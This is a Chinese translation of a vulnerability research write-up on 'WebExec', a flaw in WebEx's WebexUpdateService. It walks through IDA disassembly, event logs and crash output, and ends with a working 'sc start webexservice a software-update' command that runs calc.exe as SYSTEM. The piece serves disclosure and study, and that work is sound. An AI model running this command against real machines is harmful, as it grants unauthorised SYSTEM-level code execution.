# WebExec漏洞原理与分析浅谈
|
##### 译文声明
本文是翻译文章，文章来源：skullsecurity.org
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
本文是WebExec漏洞发现和工作原理的技术writeup。
研究人员在渗透测试过程中发现WebEx的`WebexUpdateService`存在漏洞——`WebExec`，攻击者利用该漏洞可以允许任何人登陆用户远程执行`SYSTEM`级代码。不同于一般远程代码执行漏洞的是，没有监听任何端口的客户端应用也可能存在远程代码执行漏洞。可以通过WebEx客户端的一个组件在WebEx没有监听远程连接的情况下远程执行代码。
## 简介
研究人员是在最近的一次渗透测试过程中发现的该漏洞，最初的测试目标是提升本地标准用户账户的权限，但发现了该远程代码执行漏洞，研究人员将其命名为WebExec。
WebEx的最新客户端版本是2018年8月的Version 3211.0.1801.2200,
最后修改日期2018年7月19日，SHA1值为`bf8df54e2f49d06b52388332938f5a875c43a5a7`。研究人员已经测试了许多新的和旧的版本，但都存在漏洞。
## 权限提升
研究人员发现文件夹`c:ProgramDataWebExWebExApplications`的权限很奇怪，任何人都可以进行读写，文件夹中安装了一个名为webexservice的服务，任何人都可以开始和停止该服务。
一个常见的测试方式是用`.exe`替换另一个白名单中的应用`msbuild.exe`，因为它读取相同目录中的
`.vbproj`文件的任意C#代码。因为这是一个服务，在工作目录`c:windowssystem32`下运行，所以研究人员不能向该文件夹写入。
## WebExService.exe
研究人员使用IDA来分析`WebExService.exe`。IDA中有两个简单的方法可以找出进程做了什么，分别是strings窗口和imports窗口。对webexservice.exe来说，大多数的字符串都与Windows服务相关。
      .rdata:00405438 ; wchar_t aSCreateprocess
      .rdata:00405438 aSCreateprocess:                        ; DATA XREF: sub_4025A0+1E8o
      .rdata:00405438                 unicode 0, ,0
研究人员在advapi32.dll中发现引入了CreateProcessAsUserW，下面看一下具体是怎么被调用的：
      .text:0040254E                 push    [ebp+lpProcessInformation] ; lpProcessInformation
      .text:00402554                 push    [ebp+lpStartupInfo] ; lpStartupInfo
      .text:0040255A                 push    0               ; lpCurrentDirectory
      .text:0040255C                 push    0               ; lpEnvironment
      .text:0040255E                 push    0               ; dwCreationFlags
      .text:00402560                 push    0               ; bInheritHandles
      .text:00402562                 push    0               ; lpThreadAttributes
      .text:00402564                 push    0               ; lpProcessAttributes
      .text:00402566                 push    [ebp+lpCommandLine] ; lpCommandLine
      .text:0040256C                 push    0               ; lpApplicationName
      .text:0040256E                 push    [ebp+phNewToken] ; hToken
      .text:00402574                 call    ds:CreateProcessAsUserW
末尾的W表示函数的UNICODE（wide）版本。在开发Windows代码时，开发者在代码中会使用`CreateProcessAsUser`，编译器会将其扩展为`CreateProcessAsUserA
（ASCII）`和`CreateProcessAsUserW（UNICODE）`。函数中两个最重要的参数是`hToken`和`lpCommandLine`。hToken是创建进程的用户，lpCommandLine是真实运行的命令。
###  hToken
hToken中的代码非常简单。查看调用`CreateProcessAsUserW`，就可以看到其动作执行的整个过程。
函数的顶部是：
      .text:0040241E                 call    ds:CreateToolhelp32Snapshot
这是在win32中搜索特定进程的一种普通方法，会创建运行进程的快照并用`Process32FirstW`和`Process32NextW`进行检查。研究人员曾经在用相同的技术写过一个注入工具将传统dll加载到其他进程中。
基于研究人员对API的了解，可以推测其在搜索特定进程。如果继续往下看，就可以找到调用了`_wcsicmp`，这个函数是`stricmp`所对应的`Unicode`系列的函数。
      .text:00402480                 lea     eax, [ebp+Str1]
      .text:00402486                 push    offset Str2     ; "winlogon.exe"
      .text:0040248B                 push    eax             ; Str1
      .text:0040248C                 call    ds:_wcsicmp
      .text:00402492                 add     esp, 8
      .text:00402495                 test    eax, eax
      .text:00402497                 jnz     short loc_4024BE
然后将每个进程名与`winlogon.exe`进行比对，也就是在获取到`winlogon.exe`进程的句柄。继续函数就可以看到分别顺序调用了`OpenProcess，OpenProcessToken和DuplicateTokenEx`。这是另一个常见的API调用序列，也就是进程如何获取另一个进程token的句柄。之后，复制的token会被传递给`CreateProcessAsUserW`作为`hToken`。
总结一下就是，该函数获取了`winlogon.exe`的handle，复制了其token，以相同用户`SYSTEM`创建了一个新的进程。现在需要做的就是找出进程是什么。一种简单的方法就是看API调用的顺序。
###  lpCommandLine
lpCommandLine的分析有一些复杂。研究人员使用了逆向、调试、故障检测、事件日志等方式来准确找出lpCommandLine的来源。
研究人员在分析过程中发现有大量的调试字符串和事件日志调用。因此，研究人员觉得可以尝试`Windows event viewer
(eventvwr.msc)`和`sc`进程开启`webexservice`：
    C:Usersron>sc start webexservice
    SERVICE_NAME: webexservice
            TYPE               : 10  WIN32_OWN_PROCESS
            STATE              : 2  START_PENDING
                                    (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
    [...]
下面是 WebExService.exe的日志：
    ExecuteServiceCommand::Not enough command line arguments to execute a service command.
在IDA中搜索(alt+T)：
      .text:004027DC                 cmp     edi, 3
      .text:004027DF                 jge     short loc_4027FD
      .text:004027E1                 push    offset aExecuteservice ; &quot;ExecuteServiceCommand&quot;
      .text:004027E6                 push    offset aSNotEnoughComm ; &quot;%s::Not enough command line arguments t&quot;...
      .text:004027EB                 push    2               ; wType
      .text:004027ED                 call    sub_401770
逆向的结果是：将`edit`与`3`比较，如果大于等于就跳转，否则打印需要更多参数。很容易就可以试出来需要2个以上的参数。
    C:Usersron>sc start webexservice a b
    [...]
然后检查Event Viewer：
    ExecuteServiceCommand::Service command not recognized: b.
出现错误。继续在IDA中搜索(alt+T)：
      .text:00402830 loc_402830:                             ; CODE XREF: sub_4027D0+3Dj
      .text:00402830                 push    dword ptr [esi+8]
      .text:00402833                 push    offset aExecuteservice ; "ExecuteServiceCommand"
      .text:00402838                 push    offset aSServiceComman ; "%s::Service command not recognized: %ls"...
      .text:0040283D                 push    2               ; wType
      .text:0040283F                 call    sub_401770
发现：
      .text:004027FD loc_4027FD:                             ; CODE XREF: sub_4027D0+Fj
      .text:004027FD                 push    offset aSoftwareUpdate ; "software-update"
      .text:00402802                 push    dword ptr [esi+8] ; lpString1
      .text:00402805                 call    ds:lstrcmpiW
      .text:0040280B                 test    eax, eax
      .text:0040280D                 jnz     short loc_402830 ; sc start webexservice a software-update
    [...]
命令执行会产生一条新的日志记录：
      Faulting application name: WebExService.exe, version: 3211.0.1801.2200, time stamp: 0x5b514fe3
      Faulting module name: WebExService.exe, version: 3211.0.1801.2200, time stamp: 0x5b514fe3
      Exception code: 0xc0000005
      Fault offset: 0x00002643
      Faulting process id: 0x654
      Faulting application start time: 0x01d42dbbf2bcc9b8
      Faulting application path: C:ProgramDataWebexWebexApplicationsWebExService.exe
      Faulting module path: C:ProgramDataWebexWebexApplicationsWebExService.exe
      Report Id: 31555e60-99af-11e8-8391-0800271677bd
研究人员的命令使进程奔溃了。但这里是想尝试使用其特征，因此：  
exception code是`0xc0000005`，表示内存错误。进程尝试访问一个坏的内存地址。
因此研究人员尝试暴力破解，添加更多的命令行参数。研究人员的逻辑是服务可能需要2个参数，但实际上使用的是第三个参数，但第三个参数不存在，所以进程奔溃了。  
因此使用下面的参数：
    C:Usersron>sc start webexservice a software-update a b c d e f
    [...]
同样奔溃了:
      Faulting application name: WebExService.exe, version: 3211.0.1801.2200, time stamp: 0x5b514fe3
      Faulting module name: MSVCR120.dll, version: 12.0.21005.1, time stamp: 0x524f7ce6
      Exception code: 0x40000015
      Fault offset: 0x000a7676
      Faulting process id: 0x774
      Faulting application start time: 0x01d42dbc22eef30e
      Faulting application path: C:ProgramDataWebexWebexApplicationsWebExService.exe
      Faulting module path: C:ProgramDataWebexWebexApplicationsMSVCR120.dll
      Report Id: 60a0439c-99af-11e8-8391-0800271677bd
Exception
code变成了`0x40000015`，表示`STATUS_FATAL_APP_EXIT`，也就是说应用程序退出了。因为没有输出，所以无法确定产生错误的真正原因。
下面分析其工作原理：  
根据`software-update`字符串的代码路径，就可以看到下面的函数调用：
      .text:0040281D                 call    sub_4025A0
双击跳转到该函数，可以看到：
      .text:00402616                 mov     [esp+0B4h+var_70], offset aWinsta0Default ; "winsta0\Default"
研究人员用最先进的技术搜索了该字符串，结果是一个默认桌面的句柄，常用于开启一个需要与用户交互的新进程。
在该函数中，研究人员还发现以下代码：
      .text:004026A2                 push    eax             ; EndPtr
      .text:004026A3                 push    esi             ; Str
      .text:004026A4                 call    ds:wcstod ; sc start webexservice a software-update 1 2 3 4 5 6
检查事件日志：
      StartUpdateProcess::CreateProcessAsUser:1;1;2 3 4 5 6(18).
研究人员将`2`修改为一个真实进程：
      C:Usersron>sc start webexservice a software-update 1 calc c d e f
然后就打开了真实的计算器：
    C:Usersron>tasklist | find "calc"
    calc.exe                      1476 Console                    1     10,804 K